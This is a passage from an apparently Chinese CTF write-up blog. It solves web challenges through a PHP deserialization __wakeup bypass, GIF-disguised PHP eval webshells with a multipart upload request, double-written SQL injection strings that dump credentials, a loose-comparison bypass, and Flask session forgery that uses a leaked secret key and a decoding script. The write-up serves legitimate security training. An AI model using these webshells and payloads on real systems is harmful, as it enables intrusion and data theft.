</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include &#39;flag.php&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>class Name{
</span></span><span class=line><span class=cl>    private $username = &#39;nonono&#39;;
</span></span><span class=line><span class=cl>    private $password = &#39;yesyes&#39;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    public function __construct($username,$password){
</span></span><span class=line><span class=cl>        $this-&gt;username = $username;
</span></span><span class=line><span class=cl>        $this-&gt;password = $password;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function __wakeup(){
</span></span><span class=line><span class=cl>        $this-&gt;username = &#39;guest&#39;;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    function __destruct(){
</span></span><span class=line><span class=cl>        if ($this-&gt;password != 100) {
</span></span><span class=line><span class=cl>            echo &#34;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>            echo &#34;You name is: &#34;;
</span></span><span class=line><span class=cl>            echo $this-&gt;username;echo &#34;&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>            echo &#34;You password is: &#34;;
</span></span><span class=line><span class=cl>            echo $this-&gt;password;echo &#34;&lt;/br&gt;&#34;;
</span></span><span class=line><span class=cl>            die();
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>        if ($this-&gt;username === &#39;admin&#39;) {
</span></span><span class=line><span class=cl>            global $flag;
</span></span><span class=line><span class=cl>            echo $flag;
</span></span><span class=line><span class=cl>        }else{
</span></span><span class=line><span class=cl>            echo &#34;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&#34;;
</span></span><span class=line><span class=cl>            die();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>        }
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></td></tr></table></div></div><p>获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解<a href=https://www.cnblogs.com/zy-king-karl/p/11436872.html target=_blank rel="noopener noreffer">CVE-2016-7124漏洞复现</a></p><p>我使用的构造对象</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>class Name{
</span></span><span class=line><span class=cl>    private $username =&#39;admin&#39;;
</span></span><span class=line><span class=cl>    private $password =&#39;100&#39;;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$a = new Name;
</span></span><span class=line><span class=cl>echo serialize($a);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>O:4:&#34;Name&#34;:2:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;s:3:&#34;100&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?select=O:4:&#34;Name&#34;:3:{s:14:&#34;%00Name%00username&#34;;s:5:&#34;admin&#34;;s:14:&#34;%00Name%00password&#34;;s:3:&#34;100&#34;;}
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=极客大挑战-2019upload class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019upload class=header-mark></a>[极客大挑战 2019]Upload</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121111429.png></p><p>先尝试上传一个gif图片马内容为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@eval($_POST[&#39;a&#39;]);
</span></span></code></pre></td></tr></table></div></div><p>页面提示过滤：</p><blockquote><p>NO! HACKER! your file included &lsquo;&lt;?&rsquo;</p></blockquote><p>尝试script执行php代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;script language=&#34;php&#34;&gt;eval($_POST[&#39;cmd&#39;])&lt;/script&gt;
</span></span></code></pre></td></tr></table></div></div><p>可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210121112135.png></p><hr><h1 id=20210128 class=headerLink><a href=#20210128 class=header-mark></a>2021.01.28</h1><h1 id=极客大挑战-2019babysql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019babysql class=header-mark></a>[极客大挑战 2019]BabySQL</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128113412.png></p><p>尝试万能密码，发现报错了：1=1#&rsquo; and password=&lsquo;123&rsquo;，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有<strong>information</strong>这个词，其中的<strong>for</strong>也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。</p><p>爆数据库（填密码）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
</span></span></code></pre></td></tr></table></div></div><p>爆表：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&#39;b4bsql&#39; #
</span></span></code></pre></td></tr></table></div></div><p>爆字段值：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1&#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-新生赛upload class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bupload class=header-mark></a>[ACTF2020 新生赛]Upload</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210128114257.png></p><p>指针放在灯泡上护显示上传文件的，图片马</p><p>233.gif</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@eval($_POST[&#39;a&#39;]);
</span></span></code></pre></td></tr></table></div></div><p>尝试phtml是否被过滤，直接上传成功。蚁剑连接</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>------WebKitFormBoundaryUMSByAQmR2cduL6R
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;upload_file&#34;; filename=&#34;233.phtml&#34;
</span></span><span class=line><span class=cl>Content-Type: image/gif
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GIF89a
</span></span><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>@eval($_POST[&#39;a&#39;]);
</span></span><span class=line><span class=cl>------WebKitFormBoundaryUMSByAQmR2cduL6R
</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;submit&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>upload
</span></span><span class=line><span class=cl>------WebKitFormBoundaryUMSByAQmR2cduL6R--
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=actf2020-新生赛backupfile class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bbackupfile class=header-mark></a>[ACTF2020 新生赛]BackupFile</h1><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Try to find out source file!
</span></span></code></pre></td></tr></table></div></div><p>题目提示备份文件，备份文件常见后缀：</p><blockquote><p>.git .svn .swp .~ .bak .bash_history</p></blockquote><p>尝试index.php.bak，下载了一个备份文件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>include_once &#34;flag.php&#34;;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if(isset($_GET[&#39;key&#39;])) {
</span></span><span class=line><span class=cl>    $key = $_GET[&#39;key&#39;];
</span></span><span class=line><span class=cl>    if(!is_numeric($key)) {
</span></span><span class=line><span class=cl>        exit(&#34;Just num!&#34;);
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>    $key = intval($key);
</span></span><span class=line><span class=cl>    $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;;
</span></span><span class=line><span class=cl>    if($key == $str) {
</span></span><span class=line><span class=cl>        echo $flag;
</span></span><span class=line><span class=cl>    }
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>else {
</span></span><span class=line><span class=cl>    echo &#34;Try to find out source file!&#34;;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的<code>==</code>和<code>===</code>的区别。贴一段简单代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>$str = &#39;abc&#39;;
</span></span><span class=line><span class=cl>if(0==$str){
</span></span><span class=line><span class=cl>	echo &#34;真&#34;;
</span></span><span class=line><span class=cl>}else{
</span></span><span class=line><span class=cl>	echo &#34;假&#34;;
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p><code>==</code>在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。</p><p>全等于<code>===</code>操作过程如下：</p><ol><li>操作符两边的数据类型如果不相同，返回false 。</li><li>操作符两边的值如果不相同，返回false 。</li><li>最后将上面2步的操作进行与操作。返回与操作的结果。</li></ol><p>所以最终的payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?key=123
</span></span></code></pre></td></tr></table></div></div><hr><h1 id=hctf-2018admin class=headerLink><a href=#hctf-2018admin class=header-mark></a>[HCTF 2018]admin</h1><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202182820.png></p><p>可以在注释里找到</p><blockquote></blockquote><p>思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。</p><ul><li>post。发表文章，但是没能找到在哪里打开</li><li>change password。改密码，尝试下能不能抓包改到admin的密码</li></ul><p>修改密码抓到的包：</p><p><img class=lazyload data-src=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png data-srcset="https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png 1.5x, https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png 2x" data-sizes=auto alt=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png title=https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210202183647.png></p><p>感觉并没有什么下手的地方，唯一的就是session可能和身份有关。</p><p>以下的是看网上的wp</p><p>在change password页面查看源码，发现提供了题目的源码地址</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=c>&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>网站使用的是flask框架，具体路由表如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/code&#39;</span><span class=p>)</span>		<span class=c1>#二维码</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_code</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/index&#39;</span><span class=p>)</span>		<span class=c1>#首页</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/register&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#注册</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#登陆</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>login</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/logout&#39;</span><span class=p>)</span>		<span class=c1>#登出</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>logout</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/change&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#修改密码</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>change</span><span class=p>():</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s1>&#39;/edit&#39;</span><span class=p>,</span> <span class=n>methods</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>		<span class=c1>#编辑信息</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>():</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=解法一flask-session伪造 class=headerLink><a href=#%e8%a7%a3%e6%b3%95%e4%b8%80flask-session%e4%bc%aa%e9%80%a0 class=header-mark></a>解法一：flask session伪造</h2><p>这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。</p><p>贴两篇相关文章：</p><p><a href=https://xz.aliyun.com/t/3569 target=_blank rel="noopener noreffer">Python Web之flask session&格式化字符串漏洞</a></p><p><a href=https://www.leavesongs.com/PENETRATION/client-session-security.html# target=_blank rel="noopener noreffer">客户端 session 导致的安全问题</a></p><p>首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。</p><p>说明一下flask的session值加密格式是：<code>SECRET_KEY</code> +<code>一个用户对象的字符串</code>(就像PHP里的序列化后)。<code>SECRET_KEY</code>的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;
</span></span></code></pre></td></tr></table></div></div><p>可以得知<code>SECRET_KEY</code>值为<code>ckj123</code>。然后在index.html页面发现只要session[‘name’] == &lsquo;admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。</p><p>如下 <a href=https://www.leavesongs.com/ target=_blank rel="noopener noreffer"><strong>P师傅</strong></a> 的程序解密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>zlib</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask.sessions</span> <span class=kn>import</span> <span class=n>session_json_serializer</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itsdangerous</span> <span class=kn>import</span> <span class=n>base64_decode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decryption</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span> <span class=n>sig</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>rsplit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span> <span class=n>timestamp</span> <span class=o>=</span> <span class=n>payload</span><span class=o>.</span><span class=n>rsplit</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>decompress</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>payload</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;.&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>decompress</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>base64_decode</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;Could not base64 decode the payload because of &#39;</span>
</span></span><span class=line><span class=cl>                         <span class=s1>&#39;an exception&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>decompress</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=n>zlib</span><span class=o>.</span><span class=n>decompress</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s1>&#39;Could not zlib decompress the payload before &#39;</span>
</span></span><span class=line><span class=cl>                             <span class=s1>&#39;decoding the payload&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>session_json_serializer</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>decryption</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>()))</span>
</span></span></code></pre></td></tr></table></div></div><p>执行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA
